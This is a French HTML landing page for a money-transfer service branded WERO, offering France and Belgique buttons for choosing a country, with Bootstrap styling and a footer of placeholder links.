<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sélection du pays</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
    <link rel="stylesheet" href="css/styles.css">
    <style>
        .country-buttons {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-top: 30px;
        }

        .btn-country {
            background-color: #FFF166;
            border: 2px solid black;
            font-weight: bold;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 18px;
            transition: all 0.3s ease;
            min-width: 200px;
        }

        .btn-country:hover {
            transform: scale(1.05);
            background-color: #FFE436;
            border-color: black;
        }

        .content {
            margin-top: 100px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="logo">WERO</span>
    </div>

    <div class="content">
        <h2 class="fw-bold">Sélectionnez votre pays</h2>
        <div class="country-buttons">
            <button type="button" data-pays="FR" class="btn btn-country">France</button>
            <button type="button" data-pays="BE" class="btn btn-country">Belgique</button>
        </div>
    </div>

    <footer>
        <div class="container text-center">
            <span class="logo-white">WERO</span>
            <p>Simplifiez vos transferts d'argent en Europe.</p>
            <div class="social-icons">
                <a href="#"><i class="fab fa-facebook"></i></a>
                <a href="#"><i class="fab fa-instagram"></i></a>
                <a href="#"><i class="fab fa-tiktok"></i></a>
                <a href="#"><i class="fab fa-twitter"></i></a>
            </div>
            <p class="security">SÉCURITÉ</p>
            <p>contact@wero.com</p>
            <p class="copyright">© 2024. All rights reserved.</p>
        </div>
    </footer>

    <script src="js/pays.js"></script>
</body>
</html>
